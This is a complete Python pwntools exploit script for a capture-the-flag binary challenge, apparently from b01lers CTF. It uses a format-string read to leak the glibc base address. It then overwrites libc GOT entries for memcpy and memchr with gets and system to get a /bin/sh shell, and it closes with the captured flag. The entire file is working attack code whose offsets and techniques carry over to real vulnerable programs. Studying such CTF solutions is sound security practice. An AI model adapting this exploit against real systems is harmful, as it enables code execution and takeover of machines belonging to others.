from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chal_patched', '''
    b *(main+141)
    b *(main+269)
    b *(main+283)
    continue
''')

# p = remote('guess-who-stack.harkonnen.b01lersc.tf', 8443, ssl=True)

# 1. leak glibc base address with fmtstr
p.sendlineafter(b"First shot...", b'%13$p')
p.recvuntil(b'\nPalms are sweaty, knees weak, arms are heavy ')
glibc_base_addr = int(p.recv(14), 16)-0x28150
log.info(f"glibc base address: {hex(glibc_base_addr)}")

# 2. hijack libc GOT
glibc_e = ELF('./libc.so.6')
# overwrite GOT table entry of memcpy (__printf->__vfprintf_internal->__printf_buffer->__printf_buffer_write->memcpy@got(__memmove_evex_unaligned_erms)) with gets
p.recvuntil(b"He opens his mouth but the words don\'t come out... ")
p.sendline(f"{glibc_base_addr+0x1fe150} {glibc_base_addr+glibc_e.sym.gets}".encode())
# overwrite GOT table entry of memchr (_IO_gets->_IO_getline->_IO_getline_info->memchr@got(__memchr_evex)) with system
p.recvuntil(b"\nHe\'s chokin how, everbody\'s jokin now... ")
p.sendline(f"{glibc_base_addr+0x1fe040} {glibc_base_addr+glibc_e.sym.system} /bin/sh\x00".encode())  # satisfy "mov r14, qword [r15+0x8 {_IO_FILE::_IO_read_ptr}];......mov rdi, r14;......call sub_26470;" to trigger system("/bin/sh\x00")

p.interactive()

# bctf{th3_m0m3nt_you_0wn_1t_n3ver_l3t_1t_g0_93ae4ae4d96b}